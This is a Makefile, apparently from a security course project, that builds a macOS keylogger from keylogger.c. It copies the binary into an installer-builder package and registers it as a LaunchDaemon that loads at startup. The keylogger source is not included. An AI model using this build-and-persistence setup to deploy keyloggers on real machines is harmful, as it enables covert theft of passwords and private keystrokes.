CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c
EXECUTABLE=keylogger
PLIST=keylogger.plist
INSTALLDIR=/Users/samthorley/cs6841/logger/macos-installer-builder/macOS-x64/application
PLISTDIR=/Library/LaunchDaemons
PLISTFULL=$(PLISTDIR)/$(PLIST)

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install: all
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	launchctl unload $(PLISTFULL)
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm -f $(PLISTFULL)

startup: install
	cp $(PLIST) $(PLISTFULL)
	launchctl load -w $(PLISTFULL)

load:
	launchctl load $(PLISTFULL)

unload:
	launchctl unload $(PLISTFULL)

clean:
	rm $(EXECUTABLE)
